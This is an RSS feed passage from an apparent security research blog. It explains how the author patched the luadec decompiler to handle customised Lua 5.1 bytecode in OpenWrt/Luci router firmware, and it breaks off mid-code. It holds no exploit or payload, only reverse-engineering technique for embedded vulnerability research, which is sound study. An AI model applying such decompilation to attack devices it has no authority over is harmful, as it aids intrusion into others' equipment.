class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio.fs&quot;</span>)<span class="hljs-keyword">local</span> l_0_3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.sys&quot;</span>)<span class="hljs-keyword">local</span> l_0_4 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.util&quot;</span>)<span class="hljs-keyword">local</span> l_0_5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.error&quot;</span>)<span class="hljs-keyword">local</span> l_0_6 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.log&quot;</span>)<span class="hljs-keyword">local</span> l_0_7 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.debug&quot;</span>)<span class="hljs-keyword">local</span> l_0_8 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.json&quot;</span>)<span class="hljs-keyword">local</span> l_0_9 = (<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.datatypes&quot;</span>))<span class="hljs-keyword">local</span> l_0_10 = <span class="hljs-literal">nil</span><span class="hljs-keyword">local</span> l_0_11 = <span class="hljs-string">&quot;/var/run/luci-attempts.lock&quot;</span><span class="hljs-keyword">local</span> l_0_12 = <span class="hljs-string">&quot;/tmp/luci-attempts&quot;</span><span class="hljs-keyword">local</span> l_0_13 = <span class="hljs-string">&quot;/tmp/TIME_STAMP&quot;</span><span class="hljs-keyword">local</span> l_0_14 = <span class="hljs-number">7200</span><span class="hljs-keyword">local</span> l_0_15 = <span class="hljs-number">10</span><span class="hljs-keyword">local</span> l_0_16 = <span class="hljs-number">88</span><span class="hljs-keyword">local</span> l_0_17 = <span class="hljs-number">14201</span><span class="hljs-keyword">local</span> l_0_18 = <span class="hljs-number">14203</span><span class="hljs-keyword">local</span> l_0_19 = <span class="hljs-number">24</span><span class="hljs-keyword">local</span> l_0_20 = <span class="hljs-number">13242</span><span class="hljs-keyword">local</span> l_0_21 = <span class="hljs-number">13243</span><span class="hljs-keyword">local</span> l_0_22 = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-keyword">local</span> l_0_23 = <span class="hljs-string">&quot;02008001&quot;</span><span class="hljs-keyword">local</span> l_0_24 = <span class="hljs-number">4</span><span class="hljs-keyword">local</span> l_0_25 = <span class="hljs-string">&quot;02108001&quot;</span><span class="hljs-keyword">local</span> l_0_31 = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(l_1_0)</span></span>...</code></pre><p>&#xC774;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xC11D;&#xB418;&#xC9C0; &#xC54A;&#xB294; &#xBCC0;&#xC218;&#xB97C; &#xC774;&#xC6A9;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBAA8;&#xB450; &#xD574;&#xC11D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD328;&#xCE58; &#xD55C; luadec &#xB3C4;&#xAD6C;&#xB294; &#xC544;&#xB798; Github&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><a href="https://github.com/newp1ayer48/luadec-patched">https://github.com/newp1ayer48/luadec-patched</a></p><p>&#xC124;&#xCE58; &#xBC0F; &#xC0AC;&#xC6A9;&#xC740; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xC9C4;&#xD589;&#xD558;&#xC2DC;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/newp1ayer48/luadec-patched.git<span class="hljs-built_in">cd</span> ./luadec-patched/luadecchmod +x ./luadec./luadec luaFile/lua</code></pre><p>&#xC81C;&#xC5B4; &#xD750;&#xB984; &#xBD84;&#xC11D; &#xC2E4;&#xD328; &#xC5D0;&#xB7EC;&#xC758; &#xACBD;&#xC6B0;&#xB294; &#xCD94;&#xD6C4; &#xD328;&#xCE58; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; &#xB2E4;&#xB978; &#xC81C;&#xD488;, &#xAE30;&#xAE30;, &#xD658;&#xACBD;&#xC758; Custom Lua Script&#xC5D0; &#xB300;&#xD55C; &#xB0B4;&#xC6A9;&#xC774; &#xC788;&#xC744; &#xACBD;&#xC6B0;&#xB3C4; &#xACC4;&#xC18D; &#xD328;&#xCE58; &#xD574; &#xB098;&#xAC08; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCC98;&#xC74C;&#xC5D0; Custom Lua&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xB824;&#xACE0; &#xD588;&#xC744; &#xB54C;&#xB294; &#xAD49;&#xC7A5;&#xD788; &#xB9C9;&#xB9C9;&#xD588;&#xC5C8;&#xC9C0;&#xB9CC;, &#xD30C;&#xC77C;&#xC740; &#xBD84;&#xC11D;&#xD558;&#xACE0; &#xB3C4;&#xAD6C;&#xB97C; &#xD328;&#xCE58;&#xD574; &#xB098;&#xAC08; &#xC218;&#xB85D; &#xC810;&#xCC28; &#xD574;&#xC11D;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC544;&#xC9C0;&#xB2C8; &#xBFCC;&#xB4EF;&#xD558;&#xB354;&#xAD70;&#xC694;! &#xC774; &#xAE00;&#xACFC; &#xC81C;&#xAC00; &#xD328;&#xCE58;&#xD55C; &#xB3C4;&#xAD6C;&#xAC00; Lua &#xD30C;&#xC77C;&#xC744; &#xBD84;&#xC11D;&#xD558;&#xC2DC;&#xB294; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xB3C4;&#xC6C0;&#xC774; &#xB420; &#xC218; &#xC788;&#xC73C;&#xBA74; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xB2E4;&#xC74C;&#xC5D0;&#xB294; &#xB2E4;&#xB978; &#xC784;&#xBCA0;&#xB514;&#xB4DC; &#xC8FC;&#xC81C;&#xB85C; &#xB3CC;&#xC544;&#xC624;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;! &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F44B;&#x1F3FB;</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/newp1ayer48/">newp1ayer48</category>
      
      <category domain="https://hackyboiz.github.io/tags/Embedded/">Embedded</category>
      
      <category domain="https://hackyboiz.github.io/tags/Lua/">Lua</category>
      
      <category domain="https://hackyboiz.github.io/tags/luadec/">luadec</category>
      
      <category domain="https://hackyboiz.github.io/tags/luci/">luci</category>
      
      <category domain="https://hackyboiz.github.io/tags/openwrt/">openwrt</category>
      
      
      <comments>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/kr/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Custom Lua Script  Decompile (EN)</title>
      <link>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/en/</link>
      <guid>https://hackyboiz.github.io/2025/10/04/newp1ayer48/lua/en/</guid>
      <pubDate>Sat, 04 Oct 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello! I&amp;#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &amp;#x1F938;&amp;#x1F3FB;&amp;#x200D;&amp;#x2642;&amp;#xFE0F;&lt;/p&gt;
&lt;p&gt;&lt;img sr</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello! I&#x2019;m newp1ayer48, the one in charge of the low-level at Hackyboiz! &#x1F938;&#x1F3FB;&#x200D;&#x2642;&#xFE0F;</p><p><img src="image01.jpg" alt="image01.jpg"></p><p>There&#x2019;s a language frequently used in embedded devices. It&#x2019;s the Lua script!</p><p>Embedded device manufacturers sometimes use customized versions of this Lua script. In such cases, decompiling the compiled Lua script often fails to produce proper results.</p><p>So&#x2026; for my analysis, I decided to improve and patch the decompilation tool myself. Feel free to check out the GitHub for the final patched tool first!</p><p>Let&#x2019;s cover everything from an explanation of Lua Script to how to decompile these custom Lua scripts!</p><h2 id="1-Lua-Script"><a href="#1-Lua-Script" class="headerlink" title="1. Lua Script"></a>1. Lua Script</h2><p><img src="image02.jpg" alt="image02.jpg"></p><p>Lua is a scripting language developed by a team at the Pontifical Catholic University of Rio de Janeiro (PUC-Rio) in Brazil! (The language of the gods..?) It is known for being small and lightweight, and because it also allows for system control, it&#x2019;s frequently used in embedded systems and game development. Thanks to its lightweight yet powerful scripting capabilities, it&#x2019;s also useful for tools that operate at the protocol level, like developing Wireshark plugins or custom dissectors. The official website provides full documentation on installation and the usage of each library and function. Lua has versions from 5.1 to the current 5.4.</p><p>Furthermore, it boasts excellent interoperability and extensibility with C/C++. Just like C/C++, Lua can be compiled to build files, which is why you can often find compiled Lua files inside devices or programs. The file extension is <code>.lua</code> for script files and <code>.luac</code> for compiled files. However, compiled files can also exist with a <code>.lua</code> extension, so checking the file header is the most reliable method.</p><p>From a security perspective, Lua can be a major vector for vulnerabilities. Functions like <code>os.execute()</code> can be used to execute system commands, making Command Injection a common vulnerability. Memory Corruption and Overflow vulnerabilities also occur in the Stack and Heap, with corresponding <a href="https://www.cvedetails.com/product/28436/LUA-LUA.html?vendor_id=13641">CVEs</a> being reported.</p><h3 id="1-1-OpenWrt-and-Luci"><a href="#1-1-OpenWrt-and-Luci" class="headerlink" title="1.1. OpenWrt and Luci"></a>1.1. OpenWrt and Luci</h3><p><img src="image03.png" alt="image03.png"></p><p>OpenWrt is a Linux distribution created for embedded devices, specifically routers. You can install the distribution via the <a href="https://openwrt.org/">official website</a>, which also provides detailed information on routers built with OpenWrt. It&#x2019;s an excellent site for gaining knowledge about embedded hacking! When analyzing routers during an embedded hacking project, you&#x2019;ll frequently come across routers and firmware developed based on the OpenWrt project.</p><p>Projects and firmware developed with OpenWrt often use Lua scripts. In particular, they frequently include Luci, which uses a modified Lua script to conveniently configure the web interface. They often use Lua version 5.1, so the Lua files you analyze will typically be version 5.1</p><h2 id="2-Lua-Decompiler-luadec"><a href="#2-Lua-Decompiler-luadec" class="headerlink" title="2. Lua Decompiler: luadec"></a>2. Lua Decompiler: luadec</h2><p><img src="image04.jpg" alt="image04.jpg"></p><p>It can be difficult to view the source code of a compiled Lua file. In such cases, you can use a Lua decompiler to see the original source code. The most representative decompilers are the C-based luadec and the Java-based unluac. unluac is often praised for its good performance with versions 5.2 and higher. In this article, we will be targeting Lua 5.1 files, so we&#x2019;ll proceed with decompilation using luadec.</p><p>Stock luadec does not have the OpenWrt patches applied, so you need to apply the relevant patches for the decompilation to proceed smoothly. You can install luadec and apply the OpenWrt patch as shown below.</p><pre><code class="hljs bash">sudo apt-get updatesudo apt-get install libncurses-dev libreadline-devgit <span class="hljs-built_in">clone</span> https://github.com/viruscamp/luadec<span class="hljs-built_in">cd</span> luadecgit submodule update --init lua-5.1ref=masterpatch_dir=patches.<span class="hljs-variable">$ref</span>mkdir <span class="hljs-variable">$patch_dir</span> &amp;&amp; <span class="hljs-built_in">cd</span> <span class="hljs-variable">$patch_dir</span>patchs=$(curl -sSL -H <span class="hljs-string">&apos;Accept: application/vnd.github.v3+json&apos;</span> <span class="hljs-string">&apos;https://api.github.com/repos/openwrt/openwrt/contents/package/utils/lua/patches?ref=&apos;</span><span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span> |grep -oP <span class="hljs-string">&apos;name\&quot;\s*:\s*\&quot;.*\.patch&apos;</span> |grep -oP <span class="hljs-string">&apos;\d+.*\.patch&apos;</span>)<span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-variable">$patchs</span>;<span class="hljs-keyword">do</span>  wget <span class="hljs-string">&apos;https://raw.githubusercontent.com/openwrt/openwrt/master/package/utils/lua/patches/&apos;</span><span class="hljs-variable">${p}</span>  -O <span class="hljs-variable">$p</span>;<span class="hljs-keyword">done</span><span class="hljs-built_in">cd</span> ../lua-5.1<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ../<span class="hljs-variable">${patch_dir}</span>/*.patch; <span class="hljs-keyword">do</span> patch -p1 &lt;<span class="hljs-variable">$i</span> ; <span class="hljs-keyword">done</span>MAKEFILE=<span class="hljs-string">&quot;src/Makefile&quot;</span>cp <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>.bak&quot;</span>sed -i <span class="hljs-string">&apos;/# USE_READLINE=1/a PKG_VERSION = 5.1.5&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/CFLAGS= -O2 -Wall $(MYCFLAGS)/CFLAGS= -fPIC -O2 -Wall $(MYCFLAGS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/$(CC) -o $@ -L\. -llua $(MYLDFLAGS) $(LUA_O) $(LIBS)/$(CC) -o $@ $(LUA_O) $(MYLDFLAGS) -L. -llua $(LIBS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span>sed -i <span class="hljs-string">&apos;s/$(CC) -o $@ -L\. -llua $(MYLDFLAGS) $(LUAC_O) $(LIBS)/$(CC) -o $@ $(LUAC_O) $(MYLDFLAGS) -L. -llua $(LIBS)/&apos;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$MAKEFILE</span>&quot;</span><span class="hljs-built_in">cd</span> srcmake linux<span class="hljs-built_in">export</span> LD_LIBRARY_PATH=`<span class="hljs-built_in">pwd</span>`/src/<span class="hljs-built_in">cd</span> ../../luadecmake LUAVER=5.1sudo cp luadec /usr/<span class="hljs-built_in">local</span>/bin/</code></pre><p>After installation and patching, if you decompile the example file, you can see a part of the decompilation result as shown below.</p><pre><code class="hljs lua">./luadec ./luaFile.lua</code></pre><pre><code class="hljs lua"><span class="hljs-comment">-- params : ...</span><span class="hljs-comment">-- function num : 0</span><span class="hljs-built_in">module</span>(<span class="hljs-string">&quot;luci.controller.login&quot;</span>, <span class="hljs-built_in">package</span>.<span class="hljs-built_in">seeall</span>)<span class="hljs-keyword">local</span> l_0_0 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.controller&quot;</span>)<span class="hljs-keyword">local</span> l_0_1 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio&quot;</span>)<span class="hljs-keyword">local</span> l_0_2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;nixio.fs&quot;</span>)<span class="hljs-keyword">local</span> l_0_3 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.sys&quot;</span>)<span class="hljs-keyword">local</span> l_0_4 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.util&quot;</span>)<span class="hljs-keyword">local</span> l_0_5 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.error&quot;</span>)<span class="hljs-keyword">local</span> l_0_6 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.model.log&quot;</span>)<span class="hljs-keyword">local</span> l_0_7 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.debug&quot;</span>)<span class="hljs-keyword">local</span> l_0_8 = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.json&quot;</span>)<span class="hljs-keyword">local</span> l_0_9 = (<span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;luci.tools.datatypes&quot;</span>))<span class="hljs-keyword">local</span> l_0_10 = <span class="hljs-literal">nil</span><span class="hljs-keyword">local</span> l_0_11 = <span class="hljs-string">&quot;/var/run/luci-attempts.lock&quot;</span><span class="hljs-keyword">local</span> l_0_12 = <span class="hljs-string">&quot;/tmp/luci-attempts&quot;</span><span class="hljs-keyword">local</span> l_0_13 = <span class="hljs-string">&quot;/tmp/TIME_STAMP&quot;</span><span class="hljs-keyword">local</span> l_0_14 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_15 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_16 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_17 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_18 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_19 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_20 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_21 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_22 = <span class="hljs-string">&quot;users&quot;</span><span class="hljs-keyword">local</span> l_0_23 = <span class="hljs-string">&quot;02008001&quot;</span><span class="hljs-keyword">local</span> l_0_24 = Unknown_Type_Error<span class="hljs-keyword">local</span> l_0_25 = <span class="hljs-string">&quot;02108001&quot;</span><span class="hljs-keyword">local</span> l_0_31 = <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(l_1_0)</span></span>...</code></pre><p>Looking at the decompilation result, you can see that there are variables or values that could not be interpreted.</p><p>When parts are not interpreted like this, it can make analysis difficult.</p><h2 id="3-Decompiling-custom-lua-files-with-luadec"><a href="#3-Decompiling-custom-lua-files-with-luadec" class="headerlink" title="3. Decompiling custom lua files with luadec"></a>3. Decompiling custom lua files with luadec</h2><p>The decompilation errors that occur when decompiling the sample file with luadec can be summarized as follows:</p><ul><li>Abnormal table initialization<ul><li><code>SetList fails</code></li></ul></li><li>Abnormal table initialization<ul><li><code>Unknown_Type_Error</code></li></ul></li><li>Control flow analysis failure<ul><li><code>cannot find blockend</code></li></ul></li></ul><p>Among these, the source files responsible for the core decompilation functions in luadec are:</p><ul><li><p><code>decompile.c</code></p><p>  This is the main source code that operates when luadec decompiles. The core logic for decompilation, such as interpreting the bytecode of the Lua file and handling variables and control flow, all exists within this file.</p></li><li><p><code>proto.c</code></p><p>  This source code is responsible for interpreting constant values. It translates constant values stored in the bytecode, such as numbers, strings, and booleans, into text. It also plays a role in distributing arguments to the Opcodes.</p></li></ul><p>Let&#x2019;s look at the analysis I conducted and the luadec patching methods I used to solve the decompilation errors mentioned above!</p><h3 id="3-1-Lua-File-Analysis"><a href="#3-1-Lua-File-Analysis" class="headerlink" title="3.1. Lua File Analysis"></a>3.1. Lua File Analysis</h3><p><img src="image05.png" alt="image05.png"></p><p>The structure of a Lua file is as shown in the picture above, taken from <a href="https://ieeexplore.ieee.org/document/10163061">this paper</a>. It consists of a file header, a function header, code, and a constants table. Using this structure, you can compare the file&#x2019;s hex information to check its contents.</p><p>First, to check the version information, I examined the header. The Lua file header information can be seen in the image below.</p><p><img src="image06.png" alt="image06.png"></p><p>Checking the header information of the sample Lua file confirms that it is Lua version 5.1.</p><p><img src="image07.png" alt="image07.png"></p><p>Through the code and constant table sections identifiable from the file structure, you can directly check the Opcodes and constants.</p><pre><code class="hljs bash">$ luac -l ./luafile.lua...2 [-]: CALL      R0 2 2       ; R0 := R0(R1)...$ xxd ./luaFile.lua...00000000: 1b4c 7561 5100 0104 0404 0804 0000 0000...</code></pre><p>Instructions are stored in 4-byte little-endian format. By substituting the offset location as <code>$pc * 4</code>, you can find the corresponding hex value and map it to interpret the instruction. This way, you can identify the opcode and instruction.</p><p>Using this method or by examining the luadec errors discussed later, you can confirm the existence of custom elements or parts that differ from a standard Lua file.</p><h3 id="3-2-Abnormal-table-initialization"><a href="#3-2-Abnormal-table-initialization" class="headerlink" title="3.2. Abnormal table initialization"></a>3.2. Abnormal table initialization</h3><p>This error, which appears with the message <code>SetList fails</code>, is caused by an abnormal table initialization in <code>SetList</code>. This problem occurs when the <code>SETLIST</code> instruction tries to fill a table starting from index 0, which is different from the Lua standard.</p><p>This can be confirmed in the <code>SetList()</code> function within the original <code>decompile.c</code> source code of luadec.</p><pre><code class="hljs c"><span class="hljs-comment">// decompile.c</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetList</span><span class="hljs-params">(Function* F, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> c)</span> </span>{<span class="hljs-keyword">int</span> i;DecTable* tbl = (DecTable*)FindFromListTail(&amp;(F-&gt;tables), (ListItemCmpFn)MatchTable, &amp;a);<span class="hljs-keyword">if</span> (tbl == <span class="hljs-literal">NULL</span>) {<span class="hljs-built_in">sprintf</span>(errortmp, <span class="hljs-string">&quot;No list found for R%d , SetList fails&quot;</span>, a);SET_ERROR(F, errortmp);<span class="hljs-keyword">return</span>;}<span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(rstr,<span class="hljs-string">&quot;.end&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;AddToTable(F, tbl, rstr, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>i++;};} <span class="hljs-comment">//should be {...} or func(func()) ,when b == 0, that will use all avaliable reg from R(a)</span></code></pre><p>This function handles the <code>SETLIST</code> opcode but completely ignores the <code>c</code> argument, which determines the starting index of the table. In Lua 5.1, the starting index of a table is calculated by the formula <code>(c-1) * LFIELDS_PER_FLUSH</code> (where <code>LFIELDS_PER_FLUSH</code> is usually 50).</p><p>As seen in the bytecode of the sample file, when <code>c</code> is 1, the starting index becomes 0. However, the code above does not perform this calculation, breaking the decompilation logic. To fix this, I modified the <code>SetList</code> function to correctly calculate the starting index using the <code>c</code> argument.</p><pre><code class="hljs c"><span class="hljs-comment">// decompile.c</span><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">SetList</span><span class="hljs-params">(Function* F, <span class="hljs-keyword">int</span> a, <span class="hljs-keyword">int</span> b, <span class="hljs-keyword">int</span> c)</span> </span>{<span class="hljs-keyword">int</span> i;DecTable* tbl = (DecTable*)FindFromListTail(&amp;(F-&gt;tables), (ListItemCmpFn)MatchTable, &amp;a);<span class="hljs-keyword">if</span> (tbl == <span class="hljs-literal">NULL</span>) {<span class="hljs-built_in">sprintf</span>(errortmp, <span class="hljs-string">&quot;No list found for R%d , SetList fails&quot;</span>, a);SET_ERROR(F, errortmp);<span class="hljs-keyword">return</span>;}<span class="hljs-keyword">int</span> start_index = (c - <span class="hljs-number">1</span>) * LFIELDS_PER_FLUSH;<span class="hljs-keyword">if</span> (b == <span class="hljs-number">0</span>) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr;i = <span class="hljs-number">1</span>;<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strcmp</span>(rstr,<span class="hljs-string">&quot;.end&quot;</span>) == <span class="hljs-number">0</span>)<span class="hljs-keyword">break</span>;AddToTable(F, tbl, rstr, <span class="hljs-literal">NULL</span>); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>i++;};} <span class="hljs-comment">//should be {...} or func(func()) ,when b == 0, that will use all avaliable reg from R(a)</span><span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt;= b; i++) {<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>* rstr = GetR(F, a + i);<span class="hljs-keyword">if</span> (error)<span class="hljs-keyword">return</span>;AddToTable(F, tbl, rstr, start_index + i); <span class="hljs-comment">// Lua5.1 specific <span class="hljs-doctag">TODO:</span> it&apos;s not really this :(</span>}}</code></pre><p>Patching it this way solves the <code>SetList</code> fails error!</p><h3 id="3-3-Unknown-Constant-Data-Type"><a href="#3-3-Unknown-Constant-Data-Type" class="headerlink" title="3.3. Unknown Constant Data Type"></a>3.3. Unknown Constant Data Type</h3><p>This error, which can be seen in local variables with the message <code>Unknown_Type_Error</code>, is caused by a constant. The problem arises because a specific constant type included in the bytecode is not a standard constant type, and therefore, the decompiler fails to recognize it.</p><p>This can be checked in <code>proto.c</code>, which is responsible for interpreting constant values.</p><pre><code class="hljs c"><span class="hljs-comment">// proto.c</span>...<span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">DecompileConstant</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Proto* f, <span class="hljs-keyword">int</span> i)</span> </span>{<span class="hljs-keyword">const</span> TValue* o = &amp;f-&gt;k[i];<span class="hljs-keyword">switch</span> (ttype(o)) {<span class="hljs-keyword">case</span> LUA_TBOOLEAN:<span class="hljs-keyword">return</span> strdup(bvalue(o)?<span class="hljs-string">&quot;true&quot;</span>:<span class="hljs-string">&quot;false&quot;</span>);<span class="hljs-keyword">case</span> LUA_TNIL:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;nil&quot;</span>);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> LUA_VERSION_NUM == 501 || LUA_VERSION_NUM == 502</span><span class="hljs-keyword">case</span> LUA_TNUMBER:{<span class="hljs-keyword">char</span>* ret = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">calloc</span>(<span class="hljs-number">128</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">char</span>));<span class="hljs-built_in">sprintf</span>(ret, LUA_NUMBER_FMT, nvalue(o));<span class="hljs-keyword">return</span> ret;}......<span class="hljs-keyword">default</span>:<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;Unknown_Type_Error&quot;</span>);}}</code></pre><p>The code flows to the appropriate branch for the constant type through <code>switch (ttype(o))</code>. To identify the value of the constant type causing the <code>Unknown_Type_Error</code>, I modified the code as shown below and checked the result.</p><pre><code class="hljs c"><span class="hljs-keyword">default</span>:<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;DEBUG: Found unknown constant type: %d\n&quot;</span>, ttype(o));<span class="hljs-keyword">return</span> strdup(<span class="hljs-string">&quot;Unknown_Type_Error&quot;</span>);}}</code></pre><pre><code class="hljs lua">DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span>DEBUG: Found unknown constant <span class="hljs-built_in">type</span>: <span class="hljs-number">9</span></code></pre><p>Checking the result above, we can see that the sample file uses a type of 9. The standard constant types for Lua 5.1 range from 0 to 8.</p><div class="table-container"><table><thead><tr><th>Number</th><th>Type Macro</th><th>Description</th></tr></thead><tbody><tr><td>0</td><td><code>LUA_TNIL</code></td><td><code>nil</code> value</td></tr><tr><td>1</td><td><code>LUA_TBOOLEAN</code></td><td><code>true</code> or <code>false</code></td></tr><tr><td>2</td><td><code>LUA_TLIGHTUSERDATA</code></td><td>small user data</td></tr><tr><td>3</td><td><code>LUA_TNUMBER</code></td><td>number (No distinction integer/float)</td></tr><tr><td>4</td><td><code>LUA_TSTRING</code></td><td>strings</td></tr><tr><td>5</td><td><code>LUA_TTABLE</code></td><td>table</td></tr><tr><td>6</td><td><code>LUA_TFUNCTION</code></td><td>function (closer)</td></tr><tr><td>7</td><td><code>LUA_TUSERDATA</code></td><td>all user data</td></tr><tr><td>8</td><td><code>LUA_TTHREAD</code></td><td>thread (coroutine)</td></tr></tbody></table></div><p>From this, we can confirm that the sample file uses a custom constant type with a value of 9, and the error occurs because it cannot be recognized. By looking at the disassembly where this constant type is used, we can see it&#x2019;s being used like an integer.</p><pre><code class="hljs bash">$ luadec -dis ./luaFile.lua19 [-]: SUB R6 R6 K10 ; R6 := R6 - Unknown_Type_Error</code></pre><p>To solve this, I modified the code by adding a <code>case</code> statement to handle the custom constant type 9 as an integer.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">DecompileConstant</span><span class="hljs-params">(<span class="hljs-keyword">const</span> Proto* f, <span class="hljs-keyword">int</span> i)</span> </span>{<span class="hljs-keyword">const</span> TValue* o = 